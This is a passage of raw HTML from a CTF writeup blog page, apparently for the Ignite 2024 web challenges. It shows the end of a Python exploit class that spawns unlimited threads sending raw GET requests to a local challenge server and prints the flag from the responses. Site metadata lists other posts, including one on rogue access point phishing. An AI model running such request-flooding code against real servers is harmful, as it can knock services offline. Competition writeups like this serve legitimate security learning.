p</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">send</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">raw_data</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> wait</span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">            data </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> p</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">recv</span><span style="color: #89DDFF">(</span><span style="color: #F78C6C">5000</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">            </span><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">flag</span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">in</span><span style="color: #EEFFFF"> data</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">decode</span><span style="color: #89DDFF">():</span></div><div class='line'><span style="color: #EEFFFF">                </span><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">Flag: </span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> data</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">        p</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">close</span><span style="color: #89DDFF">()</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">def</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">baby_maker</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">self</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> url</span><span style="color: #89DDFF">):</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">Started Baby Maker...</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">while</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">True:</span></div><div class='line'><span style="color: #EEFFFF">            t </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> threading</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">Thread</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">target</span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF">self</span><span style="color: #89DDFF">.</span><span style="color: #F07178">request</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #EEFFFF">args</span><span style="color: #89DDFF">=(</span><span style="color: #82AAFF">url</span><span style="color: #89DDFF">,))</span></div><div class='line'><span style="color: #EEFFFF">            t</span><span style="color: #89DDFF">.</span><span style="color: #F07178">daemon</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">True</span></div><div class='line'><span style="color: #EEFFFF">            t</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">start</span><span style="color: #89DDFF">()</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">def</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">engage</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">self</span><span style="color: #89DDFF">):</span></div><div class='line'><span style="color: #EEFFFF">        url </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">b</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">GET </span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> self</span><span style="color: #89DDFF">.</span><span style="color: #F07178">url</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">encode</span><span style="color: #89DDFF">()</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">b</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D"> HTTP/1.1</span><span style="color: #EEFFFF">&#92;r&#92;n</span><span style="color: #C3E88D">Host: localhost:8000</span><span style="color: #EEFFFF">&#92;r&#92;n&#92;r&#92;n</span><span style="color: #89DDFF">"</span></div><div class='line'><span style="color: #EEFFFF">        url2 </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">b</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">GET </span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> self</span><span style="color: #89DDFF">.</span><span style="color: #F07178">url2</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">encode</span><span style="color: #89DDFF">()</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">b</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D"> HTTP/1.1</span><span style="color: #EEFFFF">&#92;r&#92;n</span><span style="color: #C3E88D">Host: localhost:8000</span><span style="color: #EEFFFF">&#92;r&#92;n&#92;r&#92;n</span><span style="color: #89DDFF">"</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">        t </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> threading</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">Thread</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">target</span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF">self</span><span style="color: #89DDFF">.</span><span style="color: #F07178">baby_maker</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #EEFFFF">args</span><span style="color: #89DDFF">=(</span><span style="color: #82AAFF">url</span><span style="color: #89DDFF">,))</span></div><div class='line'><span style="color: #EEFFFF">        t</span><span style="color: #89DDFF">.</span><span style="color: #F07178">daemon</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">True</span></div><div class='line'><span style="color: #EEFFFF">        t</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">start</span><span style="color: #89DDFF">()</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">while</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">True:</span></div><div class='line'><span style="color: #EEFFFF">            t2 </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> threading</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">Thread</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">target</span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF">self</span><span style="color: #89DDFF">.</span><span style="color: #F07178">request</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #EEFFFF">args</span><span style="color: #89DDFF">=(</span><span style="color: #82AAFF">url2</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #89DDFF">True))</span></div><div class='line'><span style="color: #EEFFFF">            t2</span><span style="color: #89DDFF">.</span><span style="color: #F07178">daemon</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">True</span></div><div class='line'><span style="color: #EEFFFF">            t2</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">start</span><span style="color: #89DDFF">()</span></div><div class='line'></div><div class='line'><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> __name__ </span><span style="color: #89DDFF">==</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">__main__</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #82AAFF">EXPLOIT</span><span style="color: #89DDFF">().</span><span style="color: #82AAFF">engage</span><span style="color: #89DDFF">()</span></div></code></div></pre><!-- HTML_TAG_END --></main>
    <div class="divider mt-4 mb-0"></div>
      <div><a href="/?tags=ignite-24" class="btn btn-sm btn-ghost normal-case mt-2 mr-2 p-category">#ignite-24
          </a><a href="/?tags=web" class="btn btn-sm btn-ghost normal-case mt-2 mr-2 p-category">#web
          </a><a href="/?tags=ctf" class="btn btn-sm btn-ghost normal-case mt-2 mr-2 p-category">#ctf
          </a><a href="/?tags=regional" class="btn btn-sm btn-ghost normal-case mt-2 mr-2 p-category">#regional
          </a></div></div>
  
    </article>
    <footer id="footer" class="footer footer-center bg-base-300 text-base-content shadow-inner p-8 md:rounded-box sticky bottom-0 z-0 md:static "><div class="prose"><p><a href="/atom.xml" rel="noopener noreferrer external" target="_blank">Feed</a>
          
        <br>
      Copyright © 2023 - 2024
      @hash3liZer
      <br>
      Powered by
      <a rel="noopener noreferrer external" target="_blank" class="tooltip tooltip-secondary hover:text-secondary" data-tip="🌸 [δ] - Based on MDsveX & SvelteKit 🌸" href="https://github.com/importantimport/urara">Urara
      </a>
      <br>
        <!-- HTML_TAG_START -->Hosted at <a href="https://github.com/hash3liZer/khatta">Khatta</a><!-- HTML_TAG_END --></p></div></footer></div></div></div>


			<script type="application/json" data-sveltekit-fetched data-url="/posts.json">{"status":200,"statusText":"","headers":{},"body":"[{\"title\":\"CTF web challenge writeups for Ignite Islamabad 24 regional round\",\"tags\":[\"ignite-24\",\"web\",\"ctf\",\"regional\"],\"categories\":[\"CTF\",\"Writeups\"],\"summary\":\"Writeups for all web related challenges from Ignite 2024 regional round of Islamabad\",\"created\":\"2024-11-26T00:00:00.000Z\",\"lastmod\":\"2024-11-26T00:00:00.000Z\",\"image\":\"https://github.com/user-attachments/assets/505ce24b-a239-465b-b2cd-ea90a6f43bbd\",\"flags\":[],\"updated\":\"2024-11-25T22:21:28.584Z\",\"slug\":\"/blog/2024/ctf-ignite-islamabad-regional-24-web-writeups/+page.md\",\"path\":\"/blog/2024/ctf-ignite-islamabad-regional-24-web-writeups\",\"toc\":[{\"depth\":2,\"title\":\"readme | Easy\",\"slug\":\"readme--easy\"},{\"depth\":2,\"title\":\"SMG | Medium\",\"slug\":\"smg--medium\"},{\"depth\":2,\"title\":\"wtwaf | Hard\",\"slug\":\"wtwaf--hard\"}],\"type\":\"article\",\"html\":\"\"},{\"title\":\"BlackhatMEA 2024 CTF Writeups for all web challenges (Qualifiers)\",\"tags\":[\"blackhatmea-2024\",\"qualifiers\"],\"categories\":[\"CTF\",\"Writeups\"],\"summary\":\"Writeups for all web related challenges from Blackhat MEA 2024 CTF\",\"created\":\"2024-09-04T00:00:00.000Z\",\"lastmod\":\"2023-09-04T00:00:00.000Z\",\"image\":\"https://github.com/user-attachments/assets/07220c38-8cb9-4961-b1c2-7020b0baa0ad\",\"flags\":[],\"updated\":\"2024-11-25T22:21:28.584Z\",\"slug\":\"/blog/2024/blackhat-mea-24-qualifiers-web-writeups/+page.md\",\"path\":\"/blog/2024/blackhat-mea-24-qualifiers-web-writeups\",\"toc\":[{\"depth\":2,\"title\":\"Watermelon\",\"slug\":\"watermelon\"},{\"depth\":2,\"title\":\"Free Flag\",\"slug\":\"free-flag\"},{\"depth\":2,\"title\":\"Notey\",\"slug\":\"notey\"},{\"depth\":2,\"title\":\"Fastest Delivery Service\",\"slug\":\"fastest-delivery-service\"}],\"type\":\"article\",\"html\":\"\"},{\"title\":\"Setup Fake (Rogue) Access Point WiFi using HostAPD\",\"tags\":null,\"categories\":[\"wireless\",\"rogue-ap\"],\"summary\":\"A detailed guide on how to setup a rogue or fake access point wifi network using hostapdo\",\"created\":\"2024-08-25T00:00:00.000Z\",\"lastmod\":\"2023-08-25T00:00:00.000Z\",\"image\":\"https://github.com/user-attachments/assets/471e01a7-df63-414e-9370-6b8deafe6686\",\"flags\":[],\"updated\":\"2024-11-25T22:21:28.584Z\",\"slug\":\"/blog/2023/setup-fake-rogue-access-point-hostapd/+page.md\",\"path\":\"/blog/2023/setup-fake-rogue-access-point-hostapd\",\"toc\":[{\"depth\":2,\"title\":\"Technical Terms\",\"slug\":\"technical-terms\"},{\"depth\":3,\"title\":\"Phishing\",\"slug\":\"phishing\"},{\"depth\":3,\"title\":\"Wireless Adapter\",\"slug\":\"wireless-adapter\"},{\"depth\":3,\"title\":\"Is it Effective?\",\"slug\":\"is-it-effective\"},{\"depth\":2,\"title\":\"The Guide\",\"slug\":\"the-guide\"},{\"depth\":3,\"title\":\"Setup Environment\",\"slug\":\"setup-environment\"},{\"depth\":3,\"title\":\"Wireless Interface\",\"slug\":\"wireless-interface\"},{\"depth\":3,\"title\":\"Fake / Rogue Access Point\",\"slug\":\"fake--rogue-access-point\"},{\"depth\":3,\"title\":\"Multiple Access Points (Optional)\",\"slug\":\"multiple-access-points-optional\"},{\"depth\":3,\"title\":\"DHCP\",\"slug\":\"dhcp\"},{\"depth\":3,\"title\":\"Traffic Forwarding\",\"slug\":\"traffic-forwarding\"},{\"depth\":3,\"title\":\"MySQL Storage\",\"slug\":\"mysql-storage\"},{\"depth\":3,\"title\":\"Phishing Site\",\"slug\":\"phishing-site\"},{\"depth\":3,\"title\":\"Apache and MySQL\",\"slug\":\"apache-and-mysql\"},{\"depth\":3,\"title\":\"Deauthentication\",\"slug\":\"deauthentication\"},{\"depth\":3,\"title\":\"Credentials\",\"slug\":\"credentials\"},{\"depth\":2,\"title\":\"Conclusion\",\"slug\":\"conclusion\"}],\"type\":\"article\",\"html\":\"\"},{\"title\":\"WPA(2) PMKID Hash Cracking (MIC) Process Explained\",\"tags\":[\"wireless\",\"wpa-wpa2\",\"wifi\"],\"categories\":[\"Writeups\"],\"summary\":\"A guide on what the MIC is and how the actual WPA(2) cracking happens at lower level\",\"created\":\"2024-08-25T00:00:00.000Z\",\"lastmod\":\"2024-08-25T00:00:00.000Z\",\"image\":\"https://github.com/user-attachments/assets/51b06557-0a25-4ddd-a59d-6783add3a447\",\"flags\":[],\"updated\":\"2024-11-25T22:21:28.584Z\",\"slug\":\"/blog/2023/wpa-hash-cracking-process-explained-in-detal/+page.md\",\"path\":\"/blog/2023/wpa-hash-cracking-process-explained-in-detal\",\"toc\":[{\"depth\":2,\"title\":\"The Handshake Process\",\"slug\":\"the-handshake-process\"},{\"depth\":3,\"title\":\"(PML) Pairwise Master Key Computation\",\"slug\":\"pml-pairwise-master-key-computation\"},{\"depth\":3,\"title\":\"(PTK) Pairwise Transient Key Computation\",\"slug\":\"ptk-pairwise-transient-key-computation\"},{\"depth\":3,\"title\":\"(MIC) Message Integrity Code\",\"slug\":\"mic-message-integrity-code\"}],\"type\":\"article\",\"html\":\"\"},{\"title\":\"Writeups for Web challenges from HTB Cyber Apocalypse CTF 2024\",\"tags\":[\"ctf\",\"cyber-apocalypse\",\"htb\",\"htb-2024\",\"web\"],\"categories\":[\"CTF\",\"Writeups\"],\"summary\":\"This blog post contains the writeups for the web challenges that i solved from HTB Cyber Apocalypse 2024\",\"created\":\"2024-03-14T00:00:00.000Z\",\"lastmod\":\"2024-03-14T00:00:00.000Z\",\"image\":\"https://github.com/hash3liZer/khatta/assets/29171692/d5abad92-0b61-4418-af4b-582a6d03044b\",\"flags\":[],\"updated\":\"2024-11-25T22:21:28.584Z\",\"slug\":\"/blog/2023/htb-cyber-apocalypse-ctf-2024-web-writeups/+page.md\",\"path\":\"/blog/2023/htb-cyber-apocalypse-ctf-2024-web-writeups\",\"toc\":[{\"depth\":2,\"title\":\"WEB\",\"slug\":\"web\"},{\"depth\":3,\"title\":\"Labyrinth Linguist - Easy\",\"slug\":\"labyrinth-linguist---easy\"},{\"depth\":3,\"title\":\"LockTalk\",\"slug\":\"locktalk\"},{\"depth\":3,\"title\":\"SerialFlow\",\"slug\":\"serialflow\"},{\"depth\":2,\"title\":\"Ending Note\",\"slug\":\"ending-note\"}],\"type\":\"article\",\"html\":\"\"},{\"title\":\"Writeups for Web challenges from PCC 23\",\"tags\":[\"pcc23\"],\"categories\":[\"CTF\",\"Writeups\"],\"summary\":\"These are the writeups for web challenges from PCC 23 held at Air University Islamabad\",\"created\":\"2023-12-22T00:00:00.000Z\",\"lastmod\":\"2023-12-22T00:00:00.000Z\",\"image\":\"https://github.com/hash3liZer/khatta/assets/29171692/661f1693-25ee-4ea3-8599-635e7b73cb6e\",\"flags\":[],\"updated\":\"2024-11-25T22:21:28.584Z\",\"slug\":\"/blog/2023/pcc-23-web-challenge-writeups/+page.md\",\"path\":\"/blog/2023/pcc-23-web-challenge-writeups\",\"toc\":[{\"depth\":1,\"title\":\"Qualifiers\",\"slug\":\"qualifiers\"},{\"depth\":3,\"title\":\"Secure ME\",\"slug\":\"secure-me\"},{\"depth\":1,\"title\":\"Finals\",\"slug\":\"finals\"},{\"depth\":3,\"title\":\"JazzME\",\"slug\":\"jazzme\"},{\"depth\":3,\"title\":\"Lama\",\"slug\":\"lama\"}],\"type\":\"article\",\"html\":\"\"},{\"title\":\"Blackhat MEA CTF Qualifiers Web Authy and Warm Me Up Writeup\",\"tags\":[\"blackhatmea\",\"ctf\",\"authy\",\"warmme-up\",\"unicode\",\"broken-logic\"],\"categories\":[\"CTF\",\"Writeups\"],\"summary\":\"Writeups for 2 of web challenges from Blackhat MEA Qualifier CTF Round namely Authy and Warm Me Up\",\"created\":\"2023-11-13T00:00:00.000Z\",\"lastmod\":\"2023-11-13T00:00:00.000Z\",\"flags\":[],\"updated\":\"2024-11-25T22:21:28.584Z\",\"slug\":\"/blog/2023/blackhatmea-ctf-web-authy-writeup/+page.md\",\"path\":\"/blog/2023/blackhatmea-ctf-web-authy-writeup\",\"toc\":[{\"depth\":2,\"title\":\"Introduction\",\"slug\":\"introduction\"},{\"depth\":3,\"title\":\"Authy\",\"slug\":\"authy\"},{\"depth\":3,\"title\":\"Warm Me Up\",\"slug\":\"warm-me-up\"}],\"type\":\"article\",\"html\":\"\"},{\"title\":\"Deploy a Django Application on Ubuntu 22.04 with Gunicorn & NGINX\",\"tags\":[\"django\",\"deployment\",\"development\",\"drf\",\"python\",\"ubuntu\"],\"categories\":[\"Linux\",\"Development\"],\"summary\":\"A Detailed walkthrough of the process of deploying a django application on a ubuntu server from scratch. This guide covers the deployment stages with Gunicorn, NGINX and Postgresql.\",\"created\":\"2023-09-11T00:00:00.000Z\",\"lastmod\":\"2023-10-29T00:00:00.000Z\",\"image\":\"https://github.com/hash3liZer/khatta/assets/29171692/ed7dd92d-f7d1-4646-9194-e02102945392\",\"flags\":[],\"updated\":\"2024-11-25T22:21:28.584Z\",\"slug\":\"/blog/2023/deploy-django-website-nginx-gunicorn-ubuntu-22/+page.md\",\"path\":\"/blog/2023/deploy-django-website-nginx-gunicorn-ubuntu-22\",\"toc\":[{\"depth\":2,\"title\":\"Introduction\",\"slug\":\"introduction\"},{\"depth\":2,\"title\":\"Tutorial\",\"slug\":\"tutorial\"},{\"depth\":3,\"title\":\"Pre-Reqs\",\"slug\":\"pre-reqs\"},{\"depth\":3,\"title\":\"Installing Packages\",\"slug\":\"installing-packages\"},{\"depth\":3,\"title\":\"Setting up Project Directory\",\"slug\":\"setting-up-project-directory\"},{\"depth\":3,\"title\":\"Setting up Postgres (Database)\",\"slug\":\"setting-up-postgres-database\"},{\"depth\":3,\"title\":\"Project Settings\",\"slug\":\"project-settings\"},{\"depth\":3,\"title\":\"Spin up the Project\",\"slug\":\"spin-up-the-project\"},{\"depth\":3,\"title\":\"Setting up Gunicorn\",\"slug\":\"setting-up-gunicorn\"},{\"depth\":3,\"title\":\"Setting UP NGINX\",\"slug\":\"setting-up-nginx\"},{\"depth\":2,\"title\":\"Conclusion\",\"slug\":\"conclusion\"}],\"type\":\"article\",\"html\":\"\"},{\"title\":\"Web Sanity Writeup AmateursCTF 2023 DOM Clobbering and Prototype Pollution\",\"tags\":[\"amateurs-ctf\",\"writeup\",\"sanity\",\"xss\",\"dom-clobbering\",\"prototype-pollution\"],\"categories\":[\"CTF\",\"Writeups\"],\"summary\":\"A complete writeup of sanity web challenge from AmateursCTF 2023. It covers the use of the Sanitizer API in browsers, DOM Clobbering, Parameter Pollution and XSS.\",\"created\":\"2023-07-21T00:00:00.000Z\",\"lastmod\":\"2023-07-21T00:00:00.000Z\",\"image\":\"https://github.com/hash3liZer/khatta/assets/29171692/c70a5dc7-5294-45b7-8a9f-8a04ac9214b3\",\"flags\":[],\"updated\":\"2024-11-25T22:21:28.580Z\",\"slug\":\"/blog/2023/amateursctf-web-2023-writeup-sanity/+page.md\",\"path\":\"/blog/2023/amateursctf-web-2023-writeup-sanity\",\"toc\":[{\"depth\":2,\"title\":\"Introduction\",\"slug\":\"introduction\"},{\"depth\":2,\"title\":\"Surface\",\"slug\":\"surface\"},{\"depth\":2,\"title\":\"Behind the Scenes\",\"slug\":\"behind-the-scenes\"},{\"depth\":3,\"title\":\"DOM Clobbering\",\"slug\":\"dom-clobbering\"},{\"depth\":3,\"title\":\"Attacker Server\",\"slug\":\"attacker-server\"},{\"depth\":3,\"title\":\"Prototype Pollution\",\"slug\":\"prototype-pollution\"},{\"depth\":4,\"title\":\"Proof of Concept (POC)\",\"slug\":\"proof-of-concept-poc\"}],\"type\":\"article\",\"html\":\"\"},{\"title\":\"A Guide to Zone Transfer, DNS Zone Takeover and Subdomain Takeover\",\"tags\":[\"dns-zone-takeover\",\"dns-zone-transfer\",\"subdomain-takeover\",\"bugbounty\",\"infosec\",\"reconnaissance\",\"automated-tool\"],\"categories\":[\"Bug Bounty\",\"Projects\"],\"summary\":\"In this guide, we will be looking over vulnerabilites associated with a domain normally occured due to the negligence from the develper team. The terms we will see are Zone Transfer, DNS Zone Takeover and Subdomain Takeover.\",\"created\":\"2023-06-30T00:00:00.000Z\",\"lastmod\":\"2023-06-30T00:00:00.000Z\",\"image\":\"https://github.com/hash3liZer/khatta/assets/29171692/755e47ec-8f67-45e9-a7cb-04efe7584127\",\"flags\":[],\"updated\":\"2024-11-25T22:21:28.584Z\",\"slug\":\"/blog/2023/subrake-a-dns-automated-scanner/+page.md\",\"path\":\"/blog/2023/subrake-a-dns-automated-scanner\",\"toc\":[{\"depth\":2,\"title\":\"Introduction\",\"slug\":\"introduction\"},{\"depth\":2,\"title\":\"Subrake\",\"slug\":\"subrake\"},{\"depth\":2,\"title\":\"Explanation\",\"slug\":\"explanation\"},{\"depth\":3,\"title\":\"Zone Transfer\",\"slug\":\"zone-transfer\"},{\"depth\":3,\"title\":\"Subdomain Takeover\",\"slug\":\"subdomain-takeover\"},{\"depth\":3,\"title\":\"DNS Zone Takeover\",\"slug\":\"dns-zone-takeover\"},{\"depth\":4,\"title\":\"Finding Zone Takeover\",\"slug\":\"finding-zone-takeover\"},{\"depth\":2,\"title\":\"Using Subrake\",\"slug\":\"using-subrake\"},{\"depth\":2,\"title\":\"Conclusion\",\"slug\":\"conclusion\"}],\"type\":\"article\",\"html\":\"\"},{\"title\":\"BSidesTLV CTF 2023 Browselicious (Misc) Writeup\",\"tags\":[\"ctf\",\"writeups\",\"bsidestlv-ctf-2023\"],\"categories\":[\"CTF Writeups\"],\"summary\":\"Writeup for Browselicious challenge (Misc) from BsidesTLV CTF 2023\",\"created\":\"2023-06-28T00:00:00.000Z\",\"lastmod\":\"2023-06-28T00:00:00.000Z\",\"image\":\"https://github.com/hash3liZer/khatta/assets/29171692/1788ec87-fc59-49a7-a035-ec767504fb3d\",\"flags\":[],\"updated\":\"2024-11-25T22:21:28.584Z\",\"slug\":\"/blog/2023/writeup-browselicious-challenge-bsidestlv-ctf/+page.md\",\"path\":\"/blog/2023/writeup-browselicious-challenge-bsidestlv-ctf\",\"toc\":[{\"depth\":1,\"title\":\"Introducton\",\"slug\":\"introducton\"},{\"depth\":1,\"title\":\"Writeup\",\"slug\":\"writeup\"},{\"depth\":3,\"title\":\"Server Request\",\"slug\":\"server-request\"},{\"depth\":3,\"title\":\"Code Review\",\"slug\":\"code-review\"},{\"depth\":3,\"title\":\"Exploit\",\"slug\":\"exploit\"},{\"depth\":4,\"title\":\"Input Field\",\"slug\":\"input-field\"},{\"depth\":4,\"title\":\"Race Condition\",\"slug\":\"race-condition\"},{\"depth\":4,\"title\":\"Post Message\",\"slug\":\"post-message\"},{\"depth\":2,\"title\":\"PoC\",\"slug\":\"poc\"}],\"type\":\"article\",\"html\":\"\"},{\"title\":\"Google CTF 2023 Under Construction (Web) Writeup\",\"tags\":[\"ctf\",\"writeups\",\"google-ctf-2023\"],\"categories\":[\"CTF Writeups\"],\"summary\":\"Writeup for under construction challenge from google ctf 2023\",\"created\":\"2023-06-27T00:00:00.000Z\",\"lastmod\":\"2023-06-27T00:00:00.000Z\",\"image\":\"https://github.com/hash3liZer/khatta.sh/assets/29171692/f553635d-6deb-43e5-a2ae-0d8cef296db7\",\"flags\":[],\"updated\":\"2024-11-25T22:21:28.584Z\",\"slug\":\"/blog/2023/writeup-under-construction-google-ctf-2023/+page.md\",\"path\":\"/blog/2023/writeup-under-construction-google-ctf-2023\",\"toc\":[{\"depth\":1,\"title\":\"Introduction\",\"slug\":\"introduction\"},{\"depth\":1,\"title\":\"Writeup\",\"slug\":\"writeup\"},{\"depth\":2,\"title\":\"Getting Started\",\"slug\":\"getting-started\"},{\"depth\":2,\"title\":\"Vulnerable Part\",\"slug\":\"vulnerable-part\"},{\"depth\":2,\"title\":\"Exploit\",\"slug\":\"exploit\"}],\"type\":\"article\",\"html\":\"\"},{\"title\":\"Privacy Policy\",\"created\":\"2023-06-27T00:00:00.000Z\",\"flags\":[\"unlisted\"],\"updated\":\"2024-11-25T22:21:28.584Z\",\"slug\":\"/privacy/+page.svelte.md\",\"path\":\"/privacy\",\"toc\":false,\"type\":\"article\",\"html\":\"\"},{\"title\":\"SSTI Bypass using HTTP Request Referer and Cookie headers - My First App Writeup\",\"tags\":[\"UoftCTF\",\"writeup\",\"ssti\",\"template-injection\",\"jwt\"],\"categories\":[\"CTF\",\"Writeups\"],\"summary\":\"This is solution for My First App challenge from UofTCTF 23. It covers initial JWT cracking and then escalating it to SSTI. And then bypassing filters by using the request object attributes\",\"created\":\"2023-01-16T00:00:00.000Z\",\"lastmod\":\"2023-01-16T00:00:00.000Z\",\"image\":\"https://github.com/hash3liZer/khatta/assets/29171692/45d79cff-0f11-4c49-92cb-a530ee2c36a5\",\"flags\":[\"unlisted\"],\"updated\":\"2024-11-25T22:21:28.584Z\",\"slug\":\"/blog/2023/ssti-bypass-using-referer-and-cookie-my-first-app-uoftctf-23/+page.md\",\"path\":\"/blog/2023/ssti-bypass-using-referer-and-cookie-my-first-app-uoftctf-23\",\"toc\":[{\"depth\":2,\"title\":\"Introduction\",\"slug\":\"introduction\"}],\"type\":\"article\",\"html\":\"\"},{\"title\":\"About Me\",\"created\":\"2022-05-06T00:00:00.000Z\",\"flags\":[\"unlisted\"],\"updated\":\"2024-11-25T22:21:28.584Z\",\"slug\":\"/resume/+page.svelte.md\",\"path\":\"/resume\",\"toc\":[{\"depth\":2,\"title\":\"Skills\",\"slug\":\"skills\"},{\"depth\":2,\"title\":\"Experience\",\"slug\":\"experience\"},{\"depth\":2,\"title\":\"Education\",\"slug\":\"education\"},{\"depth\":2,\"title\":\"Certifications\",\"slug\":\"certifications\"},{\"depth\":2,\"title\":\"Acheivements\",\"slug\":\"acheivements\"},{\"depth\":2,\"title\":\"Projects\",\"slug\":\"projects\"},{\"depth\":2,\"title\":\"Volunteering and Startups\",\"slug\":\"volunteering-and-startups\"},{\"depth\":2,\"title\":\"Contact\",\"slug\":\"contact\"}],\"type\":\"article\",\"html\":\"\"}]"}</script>
			<script>
				{
					__sveltekit_1i71suq = {
						base: new URL("../../..", location).pathname.slice(0, -1),
						env: {}
					};

					const element = document.currentScript.parentElement;

					const data = [null,null];

					Promise.all([
						import("../../../_app/immutable/entry/start.05aaa326.js"),
						import("../../../_app/immutable/entry/app.629e3c37.js")
					]).then(([kit, app]) => {
						kit.start(app, element, {
							node_ids: [0, 15],
							data,
							form: null,
							error: null
						});
					});
				}
			</script>
		
    <div style="display: contents">%sveltekit.body%</div>
  </body>
</html>
